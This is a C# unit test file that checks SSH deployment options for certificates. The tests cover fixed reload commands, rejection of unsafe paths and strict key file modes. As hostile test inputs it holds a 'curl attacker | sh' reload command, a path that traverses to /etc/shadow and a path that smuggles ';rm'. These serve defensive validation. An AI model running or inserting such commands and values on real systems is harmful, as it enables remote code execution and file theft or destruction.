using CertificateDiscovery.Domain;
using CertificateDiscovery.Domain.Entities;
using CertificateDiscovery.Infrastructure.Deployment;

namespace CertificateDiscovery.UnitTests;

public sealed class SshTargetOptionsTests
{
    [Theory]
    [InlineData(DeploymentTargetType.Nginx, "nginx -t", "systemctl reload nginx")]
    [InlineData(DeploymentTargetType.ApacheWebServer, "apachectl configtest", "systemctl reload apache2")]
    public void Uses_fixed_allowlisted_commands(
        DeploymentTargetType type,
        string validationCommand,
        string reloadCommand)
    {
        var options = SshCertificateTargetOptions.Parse(Target(type));

        Assert.Equal(validationCommand, options.ValidationCommand);
        Assert.Equal(reloadCommand, options.ReloadCommand);
    }

    [Fact]
    public void Rejects_arbitrary_commands()
    {
        var target = Target(DeploymentTargetType.Nginx);
        target.ConfigurationJson = target.ConfigurationJson.Replace(
            "\"backupRetention\":5",
            "\"backupRetention\":5,\"reloadCommand\":\"curl attacker | sh\"");

        var exception = Assert.Throws<InvalidOperationException>(() => SshCertificateTargetOptions.Parse(target));

        Assert.Contains("not accepted", exception.Message);
    }

    [Theory]
    [InlineData("/etc/nginx/../shadow")]
    [InlineData("etc/nginx/key.pem")]
    [InlineData("/etc/nginx/key;rm.pem")]
    public void Rejects_unsafe_remote_paths(string path)
    {
        var target = Target(DeploymentTargetType.Nginx);
        target.ConfigurationJson = target.ConfigurationJson.Replace("/etc/tls/private-key.pem", path);

        Assert.Throws<InvalidOperationException>(() => SshCertificateTargetOptions.Parse(target));
    }

    [Theory]
    [InlineData("0640")]
    [InlineData("0644")]
    [InlineData("0666")]
    public void Rejects_group_or_world_readable_private_key_mode(string mode)
    {
        var target = Target(DeploymentTargetType.Nginx);
        target.ConfigurationJson = target.ConfigurationJson.Replace("\"0600\"", $"\"{mode}\"");

        Assert.Throws<InvalidOperationException>(() => SshCertificateTargetOptions.Parse(target));
    }

    internal static DeploymentTarget Target(DeploymentTargetType type) => new()
    {
        TargetType = type,
        ConfigurationJson =
            $$"""
              {
                "host":"web01.example.com",
                "sshPort":22,
                "username":"certdeployer",
                "vaultBaseUrl":"https://vault.example.com",
                "sshKeySecretPath":"secret/ssh/web01",
                "hostKeyFingerprint":"SHA256:abcdefghijklmnopqrstuvwxyz0123456789",
                "certificatePath":"/etc/tls/certificate.pem",
                "privateKeyPath":"/etc/tls/private-key.pem",
                "fullChainPath":"/etc/tls/fullchain.pem",
                "fileOwner":"root",
                "fileGroup":"{{(type == DeploymentTargetType.Nginx ? "nginx" : "apache2")}}",
                "certificateMode":"0644",
                "privateKeyMode":"0600",
                "serviceName":"{{(type == DeploymentTargetType.Nginx ? "nginx" : "apache2")}}",
                "configurationTest":true,
                "reloadService":true,
                "backupRetention":5
              }
              """
    };
}
